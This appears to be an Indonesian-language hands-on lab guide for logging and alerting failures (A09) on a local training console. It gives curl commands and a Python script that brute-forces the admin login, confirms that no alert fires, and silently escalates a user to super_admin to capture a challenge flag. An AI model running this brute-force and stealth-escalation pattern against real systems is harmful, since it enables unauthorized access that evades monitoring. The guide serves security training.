# Panduan Praktik Eksploitasi & Verifikasi (A09)

Modul ini memandu Anda mengeksploitasi titik buta telemetri dan kegagalan logging/alerting pada **Zitera SOC Audit & Telemetry Console (Port 8019)**. Anda akan mengeksekusi serangan *brute force* kredensial tanpa terdeteksi oleh SOC, melakukan eskalasi hak akses siluman (*silent privilege escalation*), dan memverifikasi keterpenuhan target lab.

---

## Metodologi Uji Penetrasi 4 Tahap

```
[Tahap 1: Observasi (15%)] ──> [Tahap 2: Injeksi Anomali (25%)] ──> [Tahap 3: Weaponization (35%)] ──> [Tahap 4: Remediasi (25%)]
   Inspeksi Stream Log Audit      Uji Brute-Force Kredensial         Lakukan Eskalasi Hak Akses        Verifikasi Target Lab &
      & Status Alert Awal               Tanpa Alert SOC             Siluman (Silent Escalation)         Reset Status Telemetri
```

---

## Tahap 1: Pengamatan & Pemetaan Permukaan Serangan (15%)

Mulailah dengan memeriksa status telemetri awal pada gateway SOC.

### 1.1 Periksa Status Kesehatan Layanan (Manual cURL)
Jalankan uji probe kesehatan layanan:

```bash
curl -i -s http://localhost:8019/health
```

Respons yang diharapkan:
```json
{"status": "ok", "lab": "A09", "port": 8019}
```

### 1.2 Inspeksi Stream Audit Log Awal (Manual cURL)
Ambil daftar log audit saat ini:

```bash
curl -i -s http://localhost:8019/api/audit/logs
```

Respons menunjukkan bahwa tidak ada peringatan aktif:
```json
{
  "logs": [],
  "alerts_fired": 0
}
```
Perhatikan bahwa `alerts_fired` bernilai `0`.

---

## Tahap 2: Uji Kegagalan Telemetri & Injeksi Anomali (25%)

Sekarang, kita menguji apakah kegagalan autentikasi berulang memicu pencatatan log atau menaikkan alarm SOC.

### 2.1 Kirimkan Percobaan Login Gagal Berulang (Manual cURL)
Kirimkan beberapa tebakan kata sandi yang salah ke endpoint `/api/auth/login`:

```bash
curl -i -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_1"}'
```

Server merespons dengan `HTTP/1.0 401 Unauthorized`:
```json
{"error": "Invalid credentials", "attempt": 1}
```

Kirimkan percobaan kedua dan ketiga:
```bash
curl -s -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_2"}'

curl -s -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_3"}'
```

### 2.2 Verifikasi Status Audit Stream
Periksa kembali apakah stream log atau alarm mencatat ketiga insiden kegagalan login tersebut:

```bash
curl -s http://localhost:8019/api/audit/logs
```

Respons tetap:
```json
{
  "logs": [],
  "alerts_fired": 0
}
```

Sistem tidak mencatat upaya pembobolan kredensial sama sekali! Ini membuktikan adanya titik buta (*blind spot*) telemetri yang parah.

---

## Tahap 3: Konstruksi Eksploitasi & Weaponization (35%)

Kondisi target lab mewajibkan eksekusi minimal 5 serangan brute-force login gagal dan 1 eskalasi hak akses siluman melalui `/api/admin/role_escalate`.

### 3.1 Skrip Otomasi Eksploitasi Python (`exploit_blindspot.py`)

Gunakan skrip Python berikut untuk mengotomatiskan rangkaian serangan:

```python
import json
import urllib.request

BASE_URL = "http://localhost:8019"

print("[*] Tahap A: Melakukan 5 serangan brute-force gagal...")
for i in range(1, 6):
    payload = {"username": "admin", "password": f"guessing_attempt_{i}"}
    req = urllib.request.Request(
        f"{BASE_URL}/api/auth/login",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        print(f"    [-] Percobaan {i}: HTTP {e.code} - {body.get('error')}")

print("\n[*] Tahap B: Memeriksa apakah ada alert yang terpicu di SOC...")
with urllib.request.urlopen(f"{BASE_URL}/api/audit/logs") as resp:
    audit_data = json.loads(resp.read().decode("utf-8"))
    print(f"    [!] Alerts Fired: {audit_data.get('alerts_fired')} (Sistem tetap hening!)")
    print(f"    [!] Jumlah Log Tercatat: {len(audit_data.get('logs'))}")

print("\n[*] Tahap C: Menjalankan eskalasi peran siluman (Silent Role Escalation)...")
escalate_payload = {
    "user": "adversary_agent",
    "role": "super_admin"
}
req = urllib.request.Request(
    f"{BASE_URL}/api/admin/role_escalate",
    data=json.dumps(escalate_payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

with urllib.request.urlopen(req) as resp:
    result = json.loads(resp.read().decode("utf-8"))
    print("[+] Respon Eskalasi:", json.dumps(result, indent=2))
    if "flag" in result:
        print("\n[+] Challenge Flag Berhasil Didapatkan!")
        print("[+] Flag:", result["flag"])
```

Jalankan skrip eksploitasi:
```bash
python exploit_blindspot.py
```

Respons server memberikan bukti kompromi berupa challenge flag (`ZITERA{...}`).

---

## Tahap 4: Verifikasi & Audit Remediasi Pertahanan (25%)

### 4.1 Verifikasi Kelulusan Target Lab
Uji apakah target reproduksi kegagalan telemetri telah tercapai:

```bash
curl -s http://localhost:8019/practice/verify
```

Respons yang diharapkan:
```json
{
  "status": "passed",
  "message": "Security logging & alerting failure reproduced: 5 brute-force attacks and 1 silent privilege escalation triggered zero SOC alerts!"
}
```

### 4.2 Reset State Telemetri
Kembalikan memori aplikasi ke kondisi bersih:

```bash
curl -X POST http://localhost:8019/api/reset
```

Konfirmasi bahwa stream log telah bersih:
```bash
curl -s http://localhost:8019/api/audit/logs
```
Respons harus mengembalikan `{"logs": [], "alerts_fired": 0}`.
